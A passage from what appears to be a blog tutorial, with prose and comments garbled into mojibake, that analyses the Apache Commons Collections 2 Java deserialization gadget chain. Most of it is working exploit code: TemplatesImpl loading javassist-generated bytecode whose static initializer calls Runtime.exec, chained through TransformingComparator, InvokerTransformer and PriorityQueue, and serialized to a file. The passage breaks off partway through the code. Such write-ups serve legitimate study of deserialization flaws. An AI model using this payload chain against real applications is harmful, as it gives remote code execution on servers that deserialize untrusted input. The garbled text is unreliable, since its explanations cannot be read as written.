        ctClass<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"LeiheheTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*åˆ›å»ºTemplatesImplå¯¹è±¡*/</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> temp <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–TemplatesImplçš„Classç±»</span>
        
        <span class="token comment">/*ä¿®æ”¹_name*/</span>
        <span class="token class-name">Field</span> _name <span class="token operator">=</span> temp<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        _name<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        _name<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
        <span class="token comment">/*ä¿®æ”¹_class*/</span>
        <span class="token class-name">Field</span> _class <span class="token operator">=</span> temp<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        _class<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        _class<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*ä¿®æ”¹_bytecodes*/</span>
        <span class="token class-name">Field</span> _bytecodes <span class="token operator">=</span> temp<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        _bytecodes<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        _bytecodes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>classBytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*ä¿®æ”¹_tfactory*/</span>
        <span class="token class-name">Field</span> _tfactory <span class="token operator">=</span> temp<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        _tfactory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        _tfactory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*callåˆ©ç”¨é“¾çš„ç¬¬ä¸€æ¡æ¥è§¦å‘æ¼æ´*/</span>
        templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//templates.getOutputProperties(); //è¿™æ¡ä¹Ÿå¯è§¦å‘</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç»“æœï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127215336783.png" alt="image-20211127215336783" loading="lazy"></p>
<h3 id="CommonsCollections-2-åˆ©ç”¨é“¾åˆ†æ"><a href="#CommonsCollections-2-åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="CommonsCollections 2 åˆ©ç”¨é“¾åˆ†æ"></a>CommonsCollections 2 åˆ©ç”¨é“¾åˆ†æ</h3><p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†TemplateImplç±»çš„åˆ©ç”¨é“¾ï¼Œåªè¦æˆ‘ä»¬æ‰¾åˆ°èƒ½å¤Ÿcallåˆ°åˆ©ç”¨é“¾ç¬¬ä¸€æ¡<code>newTransfomer()</code>çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ°ååºåˆ—åŒ–ç‚¹ã€‚</p>
<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p><code>TransformingComparator</code>çš„<code>compare</code> æ–¹æ³•å¯ä»¥è§¦å‘transform()æ–¹æ³•ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">I</span> obj1<span class="token punctuation">,</span> <span class="token class-name">I</span> obj2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">O</span> value1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">O</span> value2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çœ‹åˆ°è¿™ä¸ªtransform()æƒ³èµ·äº†ä»€ä¹ˆï¼Ÿæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>transformer</code>çš„å†…å®¹ï¼Œç„¶åæ‰§è¡Œ<code>InvokerTransformer</code>çš„<code>transform()</code>æ–¹æ³•ã€‚</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>åœ¨cc1é‡Œï¼Œæˆ‘ä»¬å°±åˆ†æè¿‡<code>InvokerTransformer</code>ï¼Œä¸å¦¨å†æ¥å›é¡¾ä¸€éï¼ŒåŠ æ·±è®°å¿†ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Class</span> cls <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„æ˜¯å…³é”®</span>
            <span class="token class-name">Method</span> method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„æ˜¯å…³é”®</span>
            <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„æ˜¯å…³é”®</span>
        <span class="token punctuation">&#125;</span> 
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">//æ­¤å¤„çœç•¥</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>InvokerTransformer</code>ä¸­å°±æœ‰ä¸€ä¸ª<code>transform()</code>çš„æ–¹æ³•ï¼Œå¦‚æœä¼ å…¥çš„<code>input</code>ä¸ä¸ºç©ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¼šä¾æ¬¡è·å–<code>input</code>çš„Classç±»ã€<code>input</code>çš„æŸä¸ªmethodï¼Œå¹¶callæˆ‘ä»¬è·å–åˆ°çš„æ–¹æ³•ã€‚</p>
<p>é‚£ä¹ˆåœ¨<code>InvokerTransformer</code>ä¸­ï¼Œæˆ‘ä»¬å°†<code>TemplateImpl</code>ç±»çš„<code>object</code>ä½œä¸º<code>input</code>ä¼ è¿›<code>transform()</code>æ–¹æ³•é‡Œå»å°±èƒ½æˆåŠŸè§¦å‘äº†ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹ï¼šæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>TransformingComparator.compare()</code> æ‰§è¡Œ<code>InvokerTransformer</code>çš„<code>transform(æˆ‘ä»¬çš„TemplateIml object)</code>ï¼Œå†æ‰§è¡Œ<code>TemplateImpl</code>çš„<code>newTransformer()</code>æ–¹æ³•</p>
<h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>åˆ©ç”¨é“¾ä¸­ç”¨åˆ°äº†<code>PriorityQueue</code>æ¥è§¦å‘<code>TransformingComparator</code>.</p>
<p>å› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„åºåˆ—åŒ–å¯¹è±¡å°±æ˜¯PriorityQueueï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä»readObject()å¼€å§‹åˆ†æã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128194719960.png" alt="image-20211128194719960" loading="lazy"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œqueueä¸­çš„å…ƒç´ ä¼šè¢«ååºåˆ—åŒ–ï¼Œç„¶åå…ƒç´ ä¼šè¢«å¤„ç†ä¸ºäºŒå‰æ ‘ç±»å‹ -&gt; **heapify()**ã€‚</p>
<h5 id="heapify"><a href="#heapify" class="headerlink" title="heapify()"></a>heapify()</h5><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token punctuation">(</span>size <span class="token operator">>>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token comment">//æ— ç¬¦å·å³ç§»1ä½</span>
        <span class="token function">siftDown</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">E</span><span class="token punctuation">)</span> queue<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†queueä¸­çš„å…ƒç´ ä¼ å…¥siftDown</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¯¥æ–¹æ³•ä¼šå¯»æ‰¾æœ€åä¸€ä¸ªéå¶å­èŠ‚ç‚¹ï¼Œç„¶åä½¿ç”¨siftDownæ–¹æ³•ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯¥å¤„çš„sizeå¿…é¡»ä¸º2ï¼Œå› ä¸ºå½“sizeä¸º1æ—¶ï¼Œ<code>siftDown()</code>ä¸ä¼šè¢«call</p>
<h5 id="shiftDown"><a href="#shiftDown" class="headerlink" title="shiftDown"></a>shiftDown</h5><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">siftDown</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token class-name">E</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>comparator <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
        <span class="token function">siftDownUsingComparator</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">siftDownComparable</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¯¥æ–¹æ³•åˆ¤æ–­comparatoræ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œåˆ™è¿›å…¥<code>siftDownUsingComparator()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128195530245.png" alt="image-20211128195530245" loading="lazy"></p>
<p>æ³¨æ„xä¸ºqueueä¸­çš„å…ƒç´ ï¼Œå¦‚æœæˆ‘ä»¬å°†<strong>comparator</strong>è®¾ä¸º<strong>TransformingComparator</strong>ï¼Œå°±å¯ä»¥è¿ä¸Šä¹‹å‰çš„é“¾äº† - queueä¸­çš„å…ƒç´ ä¼šä½œä¸º<code>InvokerTransformer</code>çš„<code>input object</code>ï¼</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211202153617378.png" alt="image-20211202153617378" loading="lazy"></p>
<p>å†æ¬¡æ€»ç»“ä¸€ä¸‹ï¼š</p>
<ul>
<li>å°†<strong>comparator</strong>è®¾ä¸º<strong>TransformingComparator</strong></li>
<li>åœ¨queueä¸­åŠ å…¥ä¸¤ä¸ªå…ƒç´ ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºæˆ‘ä»¬æ„é€ çš„<strong>templates</strong></li>
</ul>
<h3 id="Payloadæ„é€ -1"><a href="#Payloadæ„é€ -1" class="headerlink" title="Payloadæ„é€ "></a>Payloadæ„é€ </h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassClassPath</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections2</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>

        <span class="token comment">/* ç”Ÿæˆå­—èŠ‚ç  */</span>
        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        classPool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€šè¿‡CtClass.makeClassInitializeræ–¹æ³•åœ¨å½“å‰ç±»åˆ›å»ºäº†ä¸€ä¸ªé™æ€ä»£ç å—</span>
        cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¿…é¡»è¦ç»§æ‰¿AbstractTransletç±»</span>
        <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–å­—èŠ‚ç </span>


        <span class="token comment">/* TemplatesImplåŠ è½½å­—èŠ‚ç  */</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºä¸€ä¸ªtemplateså¯¹è±¡</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_class"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>classBytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/* åˆ›å»ºInvokerTransformer */</span>
        <span class="token keyword">final</span> <span class="token class-name">InvokerTransformer</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// toStringæ˜¯ä¸ºäº†ä¿è¯åœ¨æ„é€ ååºåˆ—åŒ–é“¾çš„è¿‡ç¨‹ä¸­ä¸æŠ¥é”™ï¼Œåªæ˜¯èµ·åˆ°å ä½çš„ä½œç”¨ã€‚</span>

        <span class="token comment">/* åˆ›å»ºTransformingComparator */</span>
        <span class="token class-name">TransformingComparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/* åˆ›å»ºPriorityQueue */</span>
        <span class="token keyword">final</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//priorityQueue -> TransformingComparator.compare -> InvokerTransformer.transform</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//add elements</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span><span class="token string">"iMethodName"</span><span class="token punctuation">,</span><span class="token string">"newTransformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//éœ€è¦åœ¨æœ€åä¸€æ­¥ä¿®æ”¹ï¼Œå¦åˆ™å‡ºé”™</span>

        <span class="token comment">/* å†™å‡ºåºåˆ—åŒ–æ–‡ä»¶ */</span>
        <span class="token class-name">ObjectOutputStream</span> outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"test.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">final</span> <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Field</span> <span class="token function">getField</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> clazz<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
